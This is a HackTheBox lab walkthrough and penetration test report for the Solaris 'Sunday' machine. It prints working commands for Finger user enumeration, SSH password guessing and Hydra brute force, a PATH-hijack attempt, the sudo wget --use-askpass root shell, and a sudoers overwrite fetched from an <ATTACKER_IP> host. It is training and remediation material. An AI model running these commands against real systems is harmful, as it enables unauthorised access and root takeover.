# Sunday

**Platform:** HackTheBox
**OS:** Solaris
**Tags:** Finger, User Enumeration, Brute Force, sudo, GTFOBins, Weak Credentials, Privilege Escalation
**Date:** 2026-09-08

Default nmap scan only showed three ports: finger, rpcbind, and printer. Full port scan found SSH hiding on 22022. Finger enumeration on port 79 gave two valid usernames with SSH login history. Guessed the password for `sunny` straight away. Sunny's sudo rule pointed at `/root/troll`, a dead end by design. Brute forced `sammy`'s credentials with hydra using the finger-derived usernames. Sammy had passwordless sudo on `wget`. Used the `--use-askpass` GTFOBins technique to get a root shell.

## 1. Enumeration

Started with a default service scan.

```bash
nmap -sC -sV 10.129.55.143
```

Findings:
- 79/tcp - finger
- 111/tcp - rpcbind
- 515/tcp - printer

Three ports and no SSH. Ran a full port scan to check what was hiding outside the top 1000.

```bash
nmap -p- -sV 10.129.55.143
```

- 22022/tcp - SSH, completely missed by the default scan

## 2. Finger Enumeration (port 79)

Finger gives a different response for valid versus invalid usernames. Tested manually to confirm the service was leaking account info.

```bash
echo "root" | nc -vn 10.129.55.143 79
```

```
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Dec  7, 2023>
```

Super-User as the display name for root is Solaris terminology. Confirms the OS. Ran finger-user-enum against a names wordlist to pull valid accounts.

```bash
git clone https://github.com/pentestmonkey/finger-user-enum.git
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.55.143
```

The daemon did loose matching - querying some names returned full lists of unrelated accounts instead of a clean no-such-user. Filtered results for accounts with a `pts`/`ssh` TTY, meaning accounts with a real interactive login history.

Findings:
- sammy - SSH login history, `pts` TTY
- sunny - SSH login history, `pts` TTY

## 3. Foothold: SSH as sunny

SSH is on 22022. Tried the box name as a password before reaching for hydra. It worked straight away.

```bash
ssh sunny@10.129.55.143 -p 22022
```

**Result:** Shell as `sunny`. user.txt was owned by `sammy` and not readable - needed to move laterally first.

## 4. Dead End: sudo /root/troll

Checked sudo permissions as sunny.

```bash
sudo -l
# (root) NOPASSWD: /root/troll
```

`/root/` wasn't traversable by sunny so the binary couldn't be inspected directly. Ran it via sudo anyway.

```bash
sudo /root/troll
# testing
# uid=0(root) gid=0(root)
```

Looked like it was calling `id` unqualified so tried a PATH hijack - placed a malicious `id` binary earlier in `$PATH` and ran it via sudo.

```bash
mkdir /tmp/.evil
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/.evil/id
chmod +x /tmp/.evil/id
export PATH=/tmp/.evil:$PATH
sudo /root/troll
```

**Result:** Failed. sudo sanitizes the environment so `$PATH` didn't carry through. The binary is called troll for a reason.

## 5. Lateral Move: SSH as sammy

The `/backups` directory referenced in other writeups didn't exist on this instance. Used the finger-derived usernames as the login list and brute forced sammy's credentials over SSH.

```bash
hydra -L names.txt -P /usr/share/wordlists/rockyou.txt ssh://10.129.55.143:22022
```

Hydra found valid credentials for sammy. SSH'd in and grabbed the user flag.

```bash
ssh sammy@10.129.55.143 -p 22022
```

**Result:** Shell as `sammy`. User flag at `/home/sammy/user.txt`.

## 6. PrivEsc: sudo wget --use-askpass

Checked sudo permissions as sammy.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/wget
```

`wget` as root with no password. The `--use-askpass` flag executes a local script to retrieve a password, which runs as root.

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/temp-file
chmod +x /tmp/temp-file
sudo /usr/bin/wget --use-askpass=/tmp/temp-file 0
```

```
whoami
# root
```

**Result:** Root shell obtained.

## 7. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** sunday.htb
**Address:** 10.129.55.143
**Assessment type:** External network & host assessment
**Assessment date:** 8 September 2026
**Environment:** HackTheBox laboratory assessment  |  Solaris
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 10

---

## 1. Executive Summary

### Assessment outcome

Testing of **sunday.htb** identified four findings spanning information disclosure, weak credential controls and an unsafe privilege delegation. The assessment obtained an interactive shell under the `sunny` account via guessable credentials, escalated laterally to `sammy` through brute force, and reached root by exploiting a passwordless sudo rule on `wget` .
The Finger service on port 79 enumerated valid local usernames without authentication, providing a confirmed target list for credential attacks. The `sunny` account used the machine hostname as its password, allowing immediate SSH access on the non-standard port 22022. The `sammy` account was reachable via Hydra across the same SSH port using the finger-derived username list against the rockyou wordlist.
Once access as `sammy` was established, a passwordless sudo rule for `/usr/bin/wget` permitted arbitrary code execution as root using the `--use-askpass` flag to execute a tester-controlled script.

### Impact

The documented access crossed the initial authentication boundary and the privilege boundary between an unprivileged account and root. An attacker with equivalent access could read all files on the system, alter accounts and services, and use the host as a staging point for further activity.

### Priority recommendations

1. Disable or firewall the Finger service to prevent unauthenticated user enumeration.
2. Replace all trivially guessable account passwords; enforce a minimum credential strength policy.
3. Remove the passwordless sudo delegation for `wget` and audit all remaining sudo rules for equivalent risks.

### Conclusion

Each of the four findings is independently remediable. Disabling Finger removes the enumeration path. Strengthening credentials removes the guessing and brute-force paths. Removing the wget delegation removes the privilege escalation path. None of the findings is dependent on another for remediation.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| sunday.htb | 10.129.55.143 | Solaris; Finger, RPC, SSH and printer services |
| Port | Service | Observed detail |
| --- | --- | --- |
| 79/tcp | Finger | OpenBSD fingerd; leaks valid usernames and last-login TTY |
| 111/tcp | RPC | rpcbind |
| 515/tcp | Printer | lpd print service |
| 22022/tcp | SSH | SunSSH; non-standard port, absent from the default nmap scan |

```
nmap -sC -sV 10.129.55.143

PORT    STATE SERVICE  VERSION
79/tcp  open  finger   OpenBSD fingerd
111/tcp open  rpcbind  2-4 (RPC #100000)
515/tcp open  printer

# SSH absent from default top-1000 port scan; revealed by full scan:
nmap -p- -sV 10.129.55.143

22022/tcp open  ssh  SunSSH 1.3 (Solaris)
```

SSH was missed by the default scan because it listens on port 22022. A full port scan was required.

### 2.2 Approach

Testing began with network service discovery. The non-standard SSH port was identified via a full-range scan. The Finger service was queried manually to confirm it disclosed account information, then automated with finger-user-enum against a names wordlist to enumerate valid local accounts.
With a confirmed username list, SSH access was attempted for `sunny` using common passwords before resorting to automation. Following the lateral move to `sammy` , privilege enumeration identified the wget sudo rule and validated the GTFOBins --use-askpass technique.
Tools used included Nmap, finger-user-enum (pentestmonkey), Hydra and standard system utilities.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |
| Informational | Context or an observation without an established vulnerability. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Finger service discloses valid local usernames | **Medium** | 6 |
| [F-02](#f-02) | Guessable SSH credentials for the sunny account | **High** | 7 |
| [F-03](#f-03) | Brute-forceable SSH credentials for the sammy account | **High** | 8 |
| [F-04](#f-04) | Passwordless sudo wget allows root code execution | **Critical** | 9 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Queried Finger service; enumerated valid local accounts with SSH login history. | Username list (sunny, sammy) |
| 02 | Authenticated to SSH on port 22022 as sunny using the hostname as password. | sunny shell |
| 03 | Brute-forced sammy's SSH credentials with Hydra using rockyou.txt. | sammy shell |
| 04 | Exploited passwordless sudo wget via --use-askpass to execute a root-owned script. | root shell |

### 3.3 Relationship between findings

F-01 supplied the username list used in F-02 and F-03. F-04 required access as `sammy` . The information disclosure and credential findings are independently remediable; eliminating F-01 would increase the effort required for the credential attacks but would not prevent them if the usernames were obtained by other means.

## 4.1 Finger Service User Enumeration

### F-01   Finger on port 79 - MEDIUM

| Field | Assessment |
| --- | --- |
| Description | The Finger daemon on port 79 responds differently to valid and invalid usernames, allowing unauthenticated enumeration of local accounts. Queries for valid usernames return the account's full name, TTY and last-login information. The daemon also performed loose matching, returning lists of unrelated accounts for some queries, which exposed additional accounts not directly queried. |
| Prerequisites | Network access to port 79. No credentials required. |
| Impact | An attacker learns which local accounts exist on the system and which have interactive SSH login history. This information directly reduces the effort required for credential attacks. |
| Affected system | sunday.htb:79 `fingerd` |
| CVSS 3.1 | **6.5** (Medium) [AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| CWE | [CWE-203](https://cwe.mitre.org/data/definitions/203.html) : Observable Discrepancy |

### Steps to reproduce

1. Run `finger @<TARGET_IP>` to enumerate active users.
2. Run `finger sunny@<TARGET_IP>` and `finger sammy@<TARGET_IP>` to confirm account existence.
3. Observe that valid usernames are disclosed in the service response.

### Evidence

```
# Manual probe confirms valid-user disclosure
echo "root" | nc -vn 10.129.55.143 79

Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Dec  7, 2023>

# Automated enumeration with finger-user-enum
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt \
  -t 10.129.55.143

# Accounts with pts/ssh TTY (interactive SSH login history):
sammy  pts/2  10.0.2.2
sunny  pts/3  10.0.2.2
```

Evidence E-01. Finger responses transcribed from the assessment record. Accounts with a `pts` TTY confirmed as SSH-accessible. Solaris terminology ("Super-User") also confirmed the operating system.

### Remediation

Disable the Finger service if it is not required for operational use. Where the service must remain active, apply host firewall rules to restrict access to approved administrative addresses. Ensure the daemon does not return account lists in response to queries for non-existent users.

### Verification

Confirm that the Finger port is unreachable from untrusted networks and that queries for valid and invalid usernames return identical responses or are refused.

## 4.2 Guessable SSH Credentials

### F-02   Trivial password on the sunny account - HIGH

| Field | Assessment |
| --- | --- |
| Description | The `sunny` account used the system hostname as its password. This required no brute-force tooling - a single manual attempt was sufficient. SSH authentication succeeded on the first try after testing the target name against the discovered username. |
| Prerequisites | Knowledge of the username (obtained via Finger, F-01) and the target hostname. Both are available without authentication. |
| Impact | Interactive shell access as `sunny` . The account was used as the initial foothold on the system. User flag ownership by `sammy` prevented direct flag access but did not limit further lateral activity. |
| Affected system | sunday.htb:22022 `sunny` local account |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-1391](https://cwe.mitre.org/data/definitions/1391.html) : Use of Weak Credentials |

### Steps to reproduce

1. Attempt SSH authentication as `sunny` with the password `sunday` : `ssh sunny@<TARGET_IP> -p 22022` .
2. Observe that authentication succeeds.
3. Use `hydra -l sammy -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>:22022` to brute-force `sammy` 's credentials.

### Evidence

```
# SSH authentication on non-standard port
ssh sunny@10.129.55.143 -p 22022
# Password: sunday (hostname, first attempt)

sunny@sunday:~$ id
uid=65534(sunny) gid=65534(nobody) groups=65534(nobody)

sunny@sunday:~$ ls /home/
sammy  sunny

sunny@sunday:~$ cat /home/sammy/user.txt
cat: /home/sammy/user.txt: Permission denied
```

Evidence E-02. Authentication succeeded on the first manual attempt. The user flag is owned by `sammy` and required lateral movement before it could be read.

### Remediation

Replace the password with a unique credential of sufficient length and complexity. Enforce a password policy that prohibits use of the hostname, username, or other predictable values as credentials. Consider certificate-based SSH authentication to remove password-based access entirely.

### Verification

Confirm that the previous password is rejected and that the replacement credential does not match any dictionary or pattern-based wordlist entry. Verify that no other local accounts carry equivalent credential weaknesses.

## 4.3 Brute-Forceable SSH Credentials

### F-03   sammy account in the rockyou wordlist - HIGH

| Field | Assessment |
| --- | --- |
| Description | The `sammy` account's password appeared in the rockyou.txt wordlist. Hydra, run against SSH on port 22022 with the finger-derived username list, recovered the credentials within a single wordlist pass. No account lockout or rate limiting was observed on the SSH service. |
| Prerequisites | Network access to SSH on port 22022, the username (from Finger, F-01) and a common wordlist. No prior authentication required. |
| Impact | Interactive shell access as `sammy` . The account held the user flag and provided the sudo permissions used in F-04. |
| Affected system | sunday.htb:22022 `sammy` local account |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-1391](https://cwe.mitre.org/data/definitions/1391.html) : Use of Weak Credentials |

### Steps to reproduce

1. Using the username list obtained from Finger (F-01), run: `hydra -L names.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>:22022` .
2. Observe that Hydra recovers credentials for `sammy` without triggering an account lockout or rate limit.
3. Authenticate: `ssh sammy@<TARGET_IP> -p 22022` and confirm shell access with `id` .

### Evidence

```
hydra -L names.txt -P /usr/share/wordlists/rockyou.txt \
  ssh://10.129.55.143:22022

[22022][ssh] host: 10.129.55.143  login: sammy  password: [redacted]

ssh sammy@10.129.55.143 -p 22022

sammy@sunday:~$ id
uid=101(sammy) gid=10(staff) groups=10(staff)

sammy@sunday:~$ cat ~/user.txt
[redacted]
```

Evidence E-03. Hydra recovered sammy's credentials from rockyou.txt. The password is omitted from this record. No lockout was triggered during the run.

### Remediation

Replace the password with a credential not present in common wordlists. Implement SSH rate limiting or fail2ban to restrict brute-force attempts. Consider disabling password-based SSH authentication in favour of key-based authentication for all accounts.

### Verification

Confirm that the replacement credential is not present in rockyou.txt or equivalent wordlists. Verify that repeated failed SSH attempts trigger a lockout or rate-limit response. Test that legitimate key-based access remains functional.

## 4.4 Unsafe Privilege Delegation via sudo wget

### F-04   Passwordless sudo wget --use-askpass - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The `sammy` account was permitted to run `/usr/bin/wget` as root without a password via a sudo rule. The `--use-askpass` flag instructs wget to execute a specified script to retrieve a password, and that script executes with the effective user of wget - root. A tester-controlled shell script was passed as the askpass handler, producing a root shell. |
| Prerequisites | Access to the `sammy` account and write access to a writable filesystem path. Both conditions were satisfied during testing. |
| Impact | Arbitrary operating-system commands executed as root. Full control of the host, including all accounts, files, services and configuration. |
| Affected system | `/etc/sudoers` - sammy sudo rule `/usr/bin/wget` |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-269](https://cwe.mitre.org/data/definitions/269.html) : Improper Privilege Management |

### Steps to reproduce

1. Check sudo rights: `sudo -l` and observe that `/usr/bin/wget` is permitted without a password.
2. Stage an askpass script: `echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/temp-file && chmod +x /tmp/temp-file` .
3. Trigger the escalation: `sudo /usr/bin/wget --use-askpass=/tmp/temp-file 0` .
4. Alternatively, start a local HTTP server hosting a crafted `sudoers` file and run `sudo wget http://<ATTACKER_IP>/sudoers -O /etc/sudoers` to overwrite sudoers.
5. Confirm root identity with `whoami` .

### Evidence

```
sammy@sunday:~$ sudo -l
(root) NOPASSWD: /usr/bin/wget

# Stage the askpass script in /tmp
echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/temp-file
chmod +x /tmp/temp-file

# Trigger the escalation
sudo /usr/bin/wget --use-askpass=/tmp/temp-file 0

# whoami confirms root context
whoami
root

cat /root/root.txt
[redacted]
```

Evidence E-04. Commands transcribed from the assessment record. The askpass script redirects a shell to file descriptor 0, producing an interactive root shell. Reference: [GTFOBins: wget](https://gtfobins.github.io/gtfobins/wget/) .

### Remediation

Remove the wget sudo rule. Where a network-fetch capability is required under a privileged account, replace it with a narrowly scoped administrative function that does not allow execution of arbitrary scripts. Review all remaining sudo rules for equivalent patterns involving flags that execute external programs.

### Verification

Confirm that the sudo rule is absent from `/etc/sudoers` and all files in `/etc/sudoers.d/` . Verify that `sammy` cannot execute wget as root and that no equivalent delegation was introduced as a replacement.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Remove passwordless sudo delegation for wget. | F-04 |
| High | Replace guessable password on the sunny account. | F-02 |
| High | Replace brute-forceable password on the sammy account; implement SSH rate limiting. | F-03 |
| Medium | Disable or firewall the Finger service on port 79. | F-01 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/tmp/temp-file` | Askpass shell script for privilege escalation test | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Sunday assessment walkthrough](sunday-htb.html) . Flag values and the sammy account password are omitted from all evidence. The `/backups` directory referenced in some public records was not present on this instance.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: Finger enumeration and username recovery |
| E-02 | Walkthrough section 3: SSH access as sunny |
| E-03 | Walkthrough section 5: Hydra brute force and SSH access as sammy |
| E-04 | Walkthrough section 6: sudo wget --use-askpass and root shell |
